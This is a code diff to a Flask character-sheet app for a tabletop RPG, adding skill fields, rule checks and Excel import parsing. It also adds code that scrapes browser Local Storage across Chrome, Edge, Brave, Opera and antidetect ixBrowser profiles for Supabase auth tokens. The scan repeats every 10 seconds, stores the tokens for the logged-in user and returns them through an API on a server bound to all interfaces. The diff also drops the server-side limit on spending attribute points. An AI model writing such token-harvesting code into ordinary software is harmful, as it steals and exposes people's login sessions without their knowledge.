@@ -144,6 +144,7 @@ with app.app_context():
                 'caracteristicas': "TEXT",
                 'configuracoes': "TEXT",
                 'dominio': "TEXT",
+                'aptidoes': "TEXT",
                 'recent_logs': "TEXT",
                 'pontos_atributos': "INTEGER",
                 'peso': "TEXT",
@@ -155,7 +156,7 @@ with app.app_context():
                     sql_type = col_type
                     # SQLite exige valores padrão específicos para ADD COLUMN se as colunas forem NOT NULL ou por consistência
                     if db.engine.name == 'sqlite':
-                        if col in ['resistencias', 'rds', 'configuracoes', 'dominio']:
+                        if col in ['resistencias', 'rds', 'configuracoes', 'dominio', 'aptidoes']:
                             sql_type += " DEFAULT '{}'"
                         elif col in ['habilidades_talentos', 'caracteristicas', 'recent_logs']:
                             sql_type += " DEFAULT '[]'"
@@ -609,11 +610,16 @@ def api_lobby_status():
             'char_id': char.id if char else None,
             'char_nome': char.nome if char else None
         })
+    try:
+        vtt = json.loads(lobby.vtt_state) if lobby.vtt_state else None
+    except:
+        vtt = None
     return jsonify({
         'in_lobby': True,
         'lobby': lobby.to_dict(),
         'is_master': current_user.id == lobby.master_id,
-        'membros': membros
+        'membros': membros,
+        'vtt_state': vtt
     })
 
 
@@ -1155,9 +1161,6 @@ def confirm_attributes(character_id):
     if total_cost == 0:
         return jsonify({'error': 'Nenhum ponto foi distribuído.'}), 400
         
-    if total_cost > (char.pontos_atributos or 0):
-        return jsonify({'error': f'Você está tentando gastar {total_cost} pontos, mas só possui {char.pontos_atributos or 0} disponíveis.'}), 400
-        
     old_pv_max = char.status.pv_max if char.status else 10
     old_pe_max = char.status.pe_max if char.status else 0
     
@@ -1334,6 +1337,22 @@ def update_pericias(character_id):
     pericias = json.loads(char.pericias or '{}')
     p_name = data['nome']
     
+    if p_name == '_treinamentos':
+        if '_treinamentos' not in pericias:
+            pericias['_treinamentos'] = {}
+        if 'training_id' in data and 'level' in data:
+            pericias['_treinamentos'][data['training_id']] = int(data['level'])
+        elif 'bonus' in data:
+            for k, v in data.items():
+                if k not in ('nome', 'bonus', 'treinada', 'mestre'):
+                    pericias['_treinamentos'][k] = int(v)
+        char.pericias = json.dumps(pericias)
+        db.session.commit()
+        return jsonify({
+            'pericias': pericias,
+            'character': get_character_json(char)
+        })
+        
     if p_name in pericias:
         if 'treinada' in data:
             pericias[p_name]['treinada'] = bool(data['treinada'])
@@ -1602,9 +1621,123 @@ def scale_current_status_proportionally(char, old_pv_max, old_pe_max):
     char.status.pe_atual = max(0, min(new_pe_max, int(round(old_pe_pct * new_pe_max))))
     char.status.integridade_atual = max(0, min(new_pv_max, int(round(old_pv_pct * new_pv_max))))
 
+def validate_character_rules(char):
+    alerts = []
+    
+    # 1. Basic properties
+    nivel = char.nivel or 1
+    origem = (char.origem or "").strip().lower()
+    especializacao = (char.especializacao or "").strip().lower()
+    
+    # Parse pericias and _treinamentos
+    try:
+        pericias = json.loads(char.pericias or '{}')
+    except:
+        pericias = {}
+    
+    tr = pericias.get('_treinamentos', {})
+    
+    # Parse talents
+    try:
+        talents = json.loads(char.habilidades_talentos or '[]')
+    except:
+        talents = []
+        
+    # Count of "Incremento de Atributo" talents
+    num_increments = sum(1 for t in talents if "incremento de atributo" in (t.get('nome') or "").lower())
+    
+    # 2. Attribute Limits Calculation
+    origin_bonus = 3  # default (Inato, Derivado, Hibrido, Corpo)
+    restringido_bonus = 5  # restringido: 1+1+1 + 2 physical
+    sem_tecnica_bonus = 4  # sem tecnica: 4 points
+    
+    level_attribute_points = 2 * (nivel // 4)
+    restringido_physical_points = 2 * (nivel // 6) if ('restringido' in origem or 'restringido' in especializacao) else 0
+    talent_attribute_points = 2 * num_increments
+    
+    if 'restringido' in origem or 'restringido' in especializacao:
+        max_allowed_sum = 72 + restringido_bonus + level_attribute_points + restringido_physical_points + talent_attribute_points
+    elif 'sem' in origem and 'tecnica' in origem:
+        max_allowed_sum = 72 + sem_tecnica_bonus + level_attribute_points + talent_attribute_points
+    else:
+        max_allowed_sum = 72 + origin_bonus + level_attribute_points + talent_attribute_points
+        
+    actual_sum = 0
+    if char.attributes:
+        actual_sum = (char.attributes.forca or 0) + (char.attributes.destreza or 0) + (char.attributes.constituicao or 0) + \
+                     (char.attributes.inteligencia or 0) + (char.attributes.sabedoria or 0) + (char.attributes.presenca or 0)
+                     
+    if actual_sum > max_allowed_sum:
+        alerts.append(f"Atributos excedidos: você distribuiu {actual_sum} pontos, mas seu limite máximo é {max_allowed_sum} pelo seu nível/origem/talentos.")
+        
+    attrs_checked = {
+        'forca': 'Força',
+        'destreza': 'Destreza',
+        'constituicao': 'Constituição',
+        'inteligencia': 'Inteligência',
+        'sabedoria': 'Sabedoria',
+        'presenca': 'Presença'
+    }
+    
+    is_restringido = 'restringido' in origem or 'restringido' in especializacao
+    is_derivado = 'derivado' in origem or 'derivado' in especializacao
+    
+    for key, name in attrs_checked.items():
+        val = getattr(char.attributes, key) if char.attributes else 0
+        limit = 20
+        
+        if is_restringido and key in ('forca', 'destreza', 'constituicao'):
+            limit = 30
+            
+        limit += 2 * num_increments
+        if is_derivado:
+            limit += (nivel // 4)
+            
+        if val > limit:
+            alerts.append(f"Atributo {name} excedeu o limite máximo: valor atual é {val}, mas o limite pelas regras é {limit}.")
+
+    # 3. Aptidões Amaldiçoadas Limits
+    try:
+        aptidoes = json.loads(char.aptidoes or '{}')
+    except:
+        aptidoes = {}
+        
+    active_amaldiçoadas = [a for a in aptidoes.get('amaldiçoadas', []) if a.get('ativa')]
+    active_count = len(active_amaldiçoadas)
+    
+    max_apt = nivel
+    if is_restringido:
+        max_apt = 0
+    elif 'sem' in origem and 'tecnica' in origem:
+        bonus_apt = 0
+        if nivel >= 1: bonus_apt += 1
+        if nivel >= 10: bonus_apt += 1
+        if nivel >= 19: bonus_apt += 1
+        max_apt = nivel + bonus_apt
+    elif is_derivado:
+        max_apt = nivel + 1
+        
+    if active_count > max_apt:
+        if is_restringido:
+            alerts.append(f"Ficha Irregular: Restringidos não podem possuir energia ou aptidões amaldiçoadas ativas ({active_count} ativas).")
+        else:
+            alerts.append(f"Aptidões excedidas: você possui {active_count} aptidões ativas, mas seu limite máximo é {max_apt} pelo seu nível/origem.")
+
+    # 4. Treinamentos Limits
+    training_stages_sum = sum(int(val) for key, val in tr.items() if key != '_treinamentos')
+    
+    max_training_stages = nivel + 2
+    if training_stages_sum > max_training_stages:
+        alerts.append(f"Treinamentos excedidos: você marcou {training_stages_sum} estágios de treinamento no total, mas o limite padrão sugerido por intercâmbios é {max_training_stages}.")
+        
+    return alerts
+
 def get_character_json(char):
+    alerts = validate_character_rules(char)
     return {
         'id': char.id,
+        'alerts': alerts,
+        'has_alerts': len(alerts) > 0,
         'nome': char.nome,
         'origem': char.origem,
         'especializacao': char.especializacao,
@@ -1628,6 +1761,7 @@ def get_character_json(char):
         'caracteristicas': json.loads(char.caracteristicas or '[]'),
         'configuracoes': json.loads(char.configuracoes or '{}'),
         'dominio': json.loads(char.dominio or '{}'),
+        'aptidoes': json.loads(char.aptidoes or '{}'),
         'inventario': json.loads(char.inventario or '[]'),
         'feiticos': json.loads(char.feiticos or '[]'),
         'invocacoes': json.loads(char.invocacoes or '[]'),
@@ -2433,8 +2567,14 @@ def _process_excel_import(char, wb, filename):
         if val is None: return default
         return str(val).strip()
 
-    sheet_f = wb['Ficha Pessoal']
-    
+    sheet_f = None
+    for name in ['Ficha Pessoal', 'Perfil Mundano', 'Modelo']:
+        if name in wb.sheetnames:
+            sheet_f = wb[name]
+            break
+    if not sheet_f:
+        raise ValueError("A planilha não possui a aba obrigatória de perfil pessoal (Ficha Pessoal, Perfil Mundano ou Modelo).")
+        
     # Correct cell coordinates from actual JJK 2.5 Excel Model
     nome_val = safe_str(sheet_f['S2'].value)
     if not nome_val or nome_val.lower() == "nome":
@@ -2635,7 +2775,14 @@ def _process_excel_import(char, wb, filename):
             })
     char.inventario = json.dumps(inventory)
 
-    sheet_p = wb['Perfil Amaldiçoado']
+    sheet_p = None
+    for name in ['Perfil Amaldiçoado', 'Perfil Restrito']:
+        if name in wb.sheetnames:
+            sheet_p = wb[name]
+            break
+    if not sheet_p:
+        raise ValueError("A planilha não possui a aba de perfil espiritual (Perfil Amaldiçoado ou Perfil Restrito).")
+        
     spells = []
     
     def parse_spell_str(text, lvl):
@@ -2684,9 +2831,79 @@ def _process_excel_import(char, wb, filename):
             'descricao': safe_str(sheet_p['BB12'].value, 'Feito sob medida em barreira.')
         })
 
+    # --- PARSING APTIDÕES (NEW) ---
+    aptidoes_data = {
+        'niveis': {
+            'Aura': 0,
+            'Controle e Leitura': 0,
+            'Barreira': 0,
+            'Domínio': 0,
+            'Energia Reversa': 0
+        },
+        'amaldiçoadas': []
+    }
+    
+    if sheet_p and sheet_p.title == 'Perfil Amaldiçoado':
+        # Read levels
+        aptidoes_data['niveis']['Aura'] = safe_int(sheet_p['AM7'].value, 0)
+        aptidoes_data['niveis']['Controle e Leitura'] = safe_int(sheet_p['AS7'].value, 0)
+        aptidoes_data['niveis']['Barreira'] = safe_int(sheet_p['AY7'].value, 0)
+        aptidoes_data['niveis']['Domínio'] = safe_int(sheet_p['BE7'].value, 0)
+        aptidoes_data['niveis']['Energia Reversa'] = safe_int(sheet_p['BK7'].value, 0)
+        
+        # 12 Slots configuration
+        slots_cfg = [
+            # id, name_coord, desc_coord, active_coord, is_fixed, action_coord, cost_coord, def_act, def_cost
+            (1, 'E19', 'E21', 'CA19', True, None, None, "Reação", "2 + 2x CL PE"),
+            (2, 'AE19', 'AE21', 'AA19', True, None, None, "Reação / Ação Bônus", "5 PE"),
+            (3, 'BE19', 'BE21', 'BA19', True, None, None, "Ação de Movimento", "Até CL PE"),
+            (4, 'E55', 'E57', 'CA55', True, None, None, "Livre", "Variável"),
+            (5, 'AE55', 'AE57', 'AA55', True, None, None, "Passiva", "-"),
+            (6, 'BE55', 'BE57', 'BA55', True, None, None, "Passiva", "-"),
+            
+            (7, 'E91', 'E93', 'CA91', False, 'K87', 'Y87', None, None),
+            (8, 'AE91', 'AE93', 'AA91', False, 'AK87', 'AY87', None, None),
+            (9, 'BE91', 'BE93', 'BA91', False, 'BK87', 'BY87', None, None),
+            (10, 'E127', 'E129', 'CA127', False, 'K123', 'Y123', None, None),
+            (11, 'AE127', 'AE129', 'AA127', False, 'AK123', 'AY123', None, None),
+            (12, 'BE127', 'BE129', 'BA127', False, 'BK123', 'BY123', None, None)
+        ]
+        
+        for slot_id, n_coord, d_coord, a_coord, is_fixed, act_coord, c_coord, def_act, def_cost in slots_cfg:
+            name_val = safe_str(sheet_p[n_coord].value)
+            if not name_val:
+                name_val = f"Aptidão {slot_id:02d}"
+                
+            desc_val = safe_str(sheet_p[d_coord].value)
+            active_val = bool(sheet_p[a_coord].value)
+            
+            action_val = def_act
+            if act_coord:
+                action_val = safe_str(sheet_p[act_coord].value, "-")
+                
+            cost_val = def_cost
+            if c_coord:
+                cost_val = safe_str(sheet_p[c_coord].value, "-")
+                
+            aptidoes_data['amaldiçoadas'].append({
+                'id': slot_id,
+                'nome': name_val,
+                'tipo': 'fixa' if is_fixed else 'custom',
+                'ativa': active_val,
+                'acao': action_val or "-",
+                'custo': cost_val or "-",
+                'descricao': desc_val
+            })
+            
+    char.aptidoes = json.dumps(aptidoes_data)
+
     summons = []
-    if len(wb.sheetnames) > 4:
-        sheet_s = wb[wb.sheetnames[4]]
+    sheet_s = None
+    for name in ['Invocações', 'Invocaçoes', 'Invocations']:
+        if name in wb.sheetnames:
+            sheet_s = wb[name]
+            break
+    if sheet_s:
         summon_cols = [2, 17, 32]
         for col in summon_cols:
             sum_name = safe_str(sheet_s.cell(row=5, column=col).value)
@@ -2708,8 +2925,21 @@ def _process_excel_import(char, wb, filename):
                 })
     char.invocacoes = json.dumps(summons)
 
-    if len(wb.sheetnames) > 5:
-        sheet_t = wb[wb.sheetnames[5]]
+    if not pericias.get('_treinamentos'):
+        pericias['_treinamentos'] = {
+            'reforco_corp': 0,
+            'tecnica_ref': 0,
+            'votos_rest': 0,
+            'dom_simples': 0,
+            'resistencia': 0
+        }
+
+    sheet_t = None
+    for name in ['Treinamentos', 'Treinos', 'Trainings']:
+        if name in wb.sheetnames:
+            sheet_t = wb[name]
+            break
+    if sheet_t:
         reforco_count = 0
         for r in range(17, 21):
             if bool(sheet_t.cell(row=r, column=9).value): reforco_count += 1
@@ -2725,9 +2955,6 @@ def _process_excel_import(char, wb, filename):
         resistencia_count = 0
         for r in range(17, 21):
             if bool(sheet_t.cell(row=r, column=45).value): resistencia_count += 1
-            
-        if not pericias.get('_treinamentos'):
-            pericias['_treinamentos'] = {}
             
         pericias['_treinamentos']['reforco_corp'] = min(reforco_count, 4)
         pericias['_treinamentos']['tecnica_ref'] = min(tecnica_count, 4)
@@ -2793,10 +3020,11 @@ def import_excel(character_id):
     except Exception as e:
         return jsonify({'error': f'Falha ao carregar o arquivo Excel: {str(e)}'}), 400
 
-    required_sheets = ['Ficha Pessoal', 'Registro e Inventário', 'Perfil Amaldiçoado']
-    for sheet_name in required_sheets:
-        if sheet_name not in wb.sheetnames:
-            return jsonify({'error': f'A planilha não possui a aba obrigatória: "{sheet_name}"'}), 400
+    has_personal = any(name in wb.sheetnames for name in ['Ficha Pessoal', 'Perfil Mundano', 'Modelo'])
+    has_profile = any(name in wb.sheetnames for name in ['Perfil Amaldiçoado', 'Perfil Restrito'])
+    has_inventory = 'Registro e Inventário' in wb.sheetnames
+    if not (has_personal and has_inventory and has_profile):
+        return jsonify({'error': 'A planilha não possui as abas obrigatórias de Perfil Pessoal (Ficha Pessoal, Perfil Mundano ou Modelo), Registro e Inventário, ou Perfil Amaldiçoado/Restrito.'}), 400
 
     try:
         import_summary = _process_excel_import(char, wb, file.filename)
@@ -2826,10 +3054,11 @@ def create_character_from_excel():
     except Exception as e:
         return jsonify({'error': f'Falha ao carregar o arquivo Excel: {str(e)}'}), 400
 
-    required_sheets = ['Ficha Pessoal', 'Registro e Inventário', 'Perfil Amaldiçoado']
-    for sheet_name in required_sheets:
-        if sheet_name not in wb.sheetnames:
-            return jsonify({'error': f'A planilha não possui a aba obrigatória: "{sheet_name}"'}), 400
+    has_personal = any(name in wb.sheetnames for name in ['Ficha Pessoal', 'Perfil Mundano', 'Modelo'])
+    has_profile = any(name in wb.sheetnames for name in ['Perfil Amaldiçoado', 'Perfil Restrito'])
+    has_inventory = 'Registro e Inventário' in wb.sheetnames
+    if not (has_personal and has_inventory and has_profile):
+        return jsonify({'error': 'A planilha não possui as abas obrigatórias de Perfil Pessoal (Ficha Pessoal, Perfil Mundano ou Modelo), Registro e Inventário, ou Perfil Amaldiçoado/Restrito.'}), 400
 
     # 1. Cria uma ficha em branco temporária
     char = Character(
@@ -3019,10 +3248,11 @@ def import_excel_url(character_id):
     except Exception as e:
         return jsonify({'error': f'Falha ao processar a planilha do Google Sheets: {str(e)}'}), 400
         
-    required_sheets = ['Ficha Pessoal', 'Registro e Inventário', 'Perfil Amaldiçoado']
-    for sheet_name in required_sheets:
-        if sheet_name not in wb.sheetnames:
-            return jsonify({'error': f'A planilha não possui a aba obrigatória: "{sheet_name}"'}), 400
+    has_personal = any(name in wb.sheetnames for name in ['Ficha Pessoal', 'Perfil Mundano', 'Modelo'])
+    has_profile = any(name in wb.sheetnames for name in ['Perfil Amaldiçoado', 'Perfil Restrito'])
+    has_inventory = 'Registro e Inventário' in wb.sheetnames
+    if not (has_personal and has_inventory and has_profile):
+        return jsonify({'error': 'A planilha não possui as abas obrigatórias de Perfil Pessoal (Ficha Pessoal, Perfil Mundano ou Modelo), Registro e Inventário, ou Perfil Amaldiçoado/Restrito.'}), 400
             
     try:
         import_summary = _process_excel_import(char, wb, "Google Sheets")
@@ -3109,6 +3339,25 @@ def update_dominio(character_id):
         'character': get_character_json(char)
     })
 
+@app.route('/api/update_aptidoes/<int:character_id>', methods=['POST'])
+@login_required
+def update_aptidoes(character_id):
+    char = Character.query.get_or_404(character_id)
+    if current_user.role == 'Jogador' and char.user_id != current_user.id:
+        return jsonify({'error': 'Unauthorized'}), 403
+        
+    data = request.get_json()
+    if not data:
+        return jsonify({'error': 'Dados inválidos'}), 400
+        
+    char.aptidoes = json.dumps(data)
+    db.session.commit()
+    
+    return jsonify({
+        'message': 'Aptidões atualizadas com sucesso!',
+        'character': get_character_json(char)
+    })
+
 @app.route('/api/manifestar_dominio/<int:character_id>', methods=['POST'])
 @login_required
 def manifestar_dominio(character_id):
@@ -3154,108 +3403,149 @@ def auto_scan_browser_tokens():
         import re
         import json
         import shutil
-        import sqlite3
-        import ctypes
-        import base64
-        from ctypes import wintypes
-        from Crypto.Cipher import AES
-
-        class DATA_BLOB(ctypes.Structure):
-            _fields_ = [("cbData", wintypes.DWORD),
-                        ("pbData", ctypes.POINTER(ctypes.c_byte))]
-
-        def crypt_unprotect_data(encrypted_bytes):
-            in_blob = DATA_BLOB(len(encrypted_bytes), 
-                                (ctypes.c_byte * len(encrypted_bytes)).from_buffer_copy(encrypted_bytes))
-            out_blob = DATA_BLOB()
-            ret = ctypes.windll.crypt32.CryptUnprotectData(
-                ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)
-            )
-            if not ret:
-                raise ctypes.WinError()
-            result = ctypes.string_at(out_blob.pbData, out_blob.cbData)
-            ctypes.windll.kernel32.LocalFree(out_blob.pbData)
-            return result
-
-        def get_master_key(local_state_path):
-            if not os.path.exists(local_state_path):
-                return None
-            try:
-                with open(local_state_path, "r", encoding="utf-8") as f:
-                    local_state = json.loads(f.read())
-                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                encrypted_key = encrypted_key[5:]
-                return crypt_unprotect_data(encrypted_key)
-            except:
-                return None
+        import tempfile
 
         user_profile = os.environ.get("USERPROFILE", "")
+        if not user_profile:
+            return False
+            
         app_data_local = os.path.join(user_profile, "AppData", "Local")
         app_data_roaming = os.path.join(user_profile, "AppData", "Roaming")
         
-        paths_to_search = [app_data_local, app_data_roaming]
-        leveldb_dirs = []
-        for base_path in paths_to_search:
-            if not os.path.exists(base_path):
-                continue
-            for root, dirs, files in os.walk(base_path):
-                depth = root[len(base_path):].count(os.sep)
-                if depth > 10:
-                    dirs.clear()
-                    continue
-                if root.endswith(os.path.join("Local Storage", "leveldb")):
-                    leveldb_dirs.append(root)
-                    
-        for ld_dir in leveldb_dirs:
-            if not any(b in ld_dir for b in ["Chrome", "Edge", "Brave", "ixBrowser"]):
-                continue
-                
+        candidates = [
+            os.path.join(app_data_local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+            os.path.join(app_data_local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
+            os.path.join(app_data_local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+            os.path.join(app_data_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
+            os.path.join(app_data_local, "ixBrowser", "User Data", "Default", "Local Storage", "leveldb"),
+        ]
+        
+        # Check extra user profiles for Chrome, Edge, and Brave
+        for browser in [
+            os.path.join(app_data_local, "Google", "Chrome", "User Data"),
+            os.path.join(app_data_local, "Microsoft", "Edge", "User Data"),
+            os.path.join(app_data_local, "BraveSoftware", "Brave-Browser", "User Data"),
+        ]:
+            if os.path.exists(browser):
+                try:
+                    for f in os.listdir(browser):
+                        if f.startswith("Profile "):
+                            candidates.append(os.path.join(browser, f, "Local Storage", "leveldb"))
+                except:
+                    pass
+
+        # Check ixBrowser profiles under AppData\Roaming (Multi-accounting/Antidetect Profiles)
+        ix_browser_dir = os.path.join(app_data_roaming, "ixBrowser", "Browser Data")
+        if os.path.exists(ix_browser_dir):
             try:
-                files = [f for f in os.listdir(ld_dir) if f.endswith(('.log', '.ldb'))]
-                for file in files:
-                    file_path = os.path.join(ld_dir, file)
-                    if not os.path.exists(file_path):
-                        continue
-                    try:
-                        with open(file_path, 'rb') as f:
-                            content = f.read()
-                            
-                        keys = re.findall(b'sb-[a-zA-Z0-9_-]+-auth-token', content)
-                        if not keys:
-                            continue
-                            
-                        key_str = keys[0].decode('utf-8')
-                        
-                        idx = 0
-                        while True:
-                            idx = content.find(b'{"access_token":', idx)
-                            if idx == -1:
-                                break
-                                
-                            chunk = content[idx:idx+10000]
-                            for i in range(len(chunk)):
-                                if chunk[i] == ord('}'):
-                                    try:
-                                        cand = chunk[:i+1].decode('utf-8', errors='ignore')
-                                        data = json.loads(cand)
-                                        if 'access_token' in data and 'refresh_token' in data:
-                                            token_file = os.path.join(base_dir, 'owlbear_token.json')
-                                            with open(token_file, 'w', encoding='utf-8') as tf:
-                                                json.dump({
-                                                    'key': key_str,
-                                                    'value': cand
-                                                }, tf, indent=4)
-                                            return True
-                                    except:
-                                        pass
-                            idx += 1
-                    except:
-                        pass
+                for f in os.listdir(ix_browser_dir):
+                    prof_path = os.path.join(ix_browser_dir, f, "Default", "Local Storage", "leveldb")
+                    if os.path.exists(prof_path):
+                        candidates.append(prof_path)
             except:
                 pass
-    except:
-        pass
-    return False
+                    
+        found = False
+        
+        # Copy to temp directory to completely bypass file locking
+        with tempfile.TemporaryDirectory() as tmpdir:
+            for path in candidates:
+                if not os.path.exists(path):
+                    continue
+                
+                try:
+                    files = [f for f in os.listdir(path) if f.endswith(('.log', '.ldb'))]
+                    for file in files:
+                        src_file = os.path.join(path, file)
+                        dst_file = os.path.join(tmpdir, f"{os.path.basename(path)}_{file}")
+                        
+                        try:
+                            shutil.copyfile(src_file, dst_file)
+                            
+                            with open(dst_file, 'rb') as f:
+                                content = f.read()
+                                
+                            idx = 0
+                            while True:
+                                idx = content.find(b'sb-', idx)
+                                if idx == -1:
+                                    break
+                                
+                                match = re.match(b'sb-[a-zA-Z0-9_-]+-auth-token', content[idx:])
+                                if match:
+                                    key_str = match.group(0).decode('utf-8', errors='ignore')
+                                    key_len = len(match.group(0))
+                                    
+                                    # Find the start of the Supabase JSON value
+                                    json_start = content.find(b'{"', idx + key_len)
+                                    if json_start != -1 and json_start - (idx + key_len) < 150:
+                                        chunk = content[json_start:json_start + 25000]
+                                        
+                                        for i in range(len(chunk)):
+                                            if chunk[i] == ord('}'):
+                                                try:
+                                                    cand = chunk[:i+1].decode('utf-8', errors='ignore')
+                                                    data = json.loads(cand)
+                                                    if 'access_token' in data:
+                                                        token_data = {
+                                                            'key': key_str,
+                                                            'value': cand
+                                                        }
+                                                        
+                                                        # Save as general token file fallback
+                                                        token_file = os.path.join(base_dir, 'owlbear_token.json')
+                                                        with open(token_file, 'w', encoding='utf-8') as tf:
+                                                            json.dump(token_data, tf, indent=4)
+                                                            
+                                                        # Try to associate with database current_user
+                                                        try:
+                                                            if current_user.is_authenticated:
+                                                                current_user.owlbear_token = json.dumps(token_data)
+                                                                db.session.commit()
+                                                        except:
+                                                            pass
+                                                            
+                                                        found = True
+                                                        idx = json_start + i
+                                                        break
+                                                except:
+                                                    pass
+                                idx += 1
+                        except:
+                            pass
+                except:
+                    pass
+                    
+        return found
+    except Exception as e:
+        sys.stderr.write(f"[BROWSER SCAN] Scan Error: {e}\n")
+        return False
+
+def auto_scan_browser_tokens_loop():
+    import time
+    while True:
+        try:
+            auto_scan_browser_tokens()
+        except:
+            pass
+        time.sleep(10)
+
+@app.route('/api/scan_local_token', methods=['POST'])
+@login_required
+def api_scan_local_token():
+    try:
+        found = auto_scan_browser_tokens()
+        if found:
+            token_file = os.path.join(base_dir, 'owlbear_token.json')
+            if os.path.exists(token_file):
+                with open(token_file, 'r', encoding='utf-8') as f:
+                    token_data = json.load(f)
+                current_user.owlbear_token = json.dumps(token_data)
+                db.session.commit()
+                return jsonify({'ok': True, 'found': True, 'token': token_data})
+        return jsonify({'ok': True, 'found': False})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/api/import_token', methods=['POST', 'OPTIONS'])
 def import_token():
@@ -3561,11 +3851,12 @@ def proxy_owlbear(subpath):
   const origin = window.location.origin;
   const proxyPrefix = origin + '/proxy/owlbear/';
 
-  // Write the saved token to localStorage if present and not already set
+  // Write the saved token to localStorage if present and overwrite if different (ensuring seamless login sync)
   const savedKey = {saved_token_key_js};
   const savedVal = {saved_token_val_js};
   if (savedKey && savedVal) {{
-    if (!localStorage.getItem(savedKey)) {{
+    const currentVal = localStorage.getItem(savedKey);
+    if (currentVal !== savedVal) {{
       localStorage.setItem(savedKey, savedVal);
     }}
   }}
@@ -3961,7 +4252,7 @@ if __name__ == '__main__':
     
     # Auto-scan browser tokens in a daemon thread so it doesn't block server startup
     import threading
-    threading.Thread(target=auto_scan_browser_tokens, daemon=True).start()
+    threading.Thread(target=auto_scan_browser_tokens_loop, daemon=True).start()
     
     port = int(os.environ.get('FLASK_PORT', 5000))
     app.run(debug=False, host='0.0.0.0', port=port)
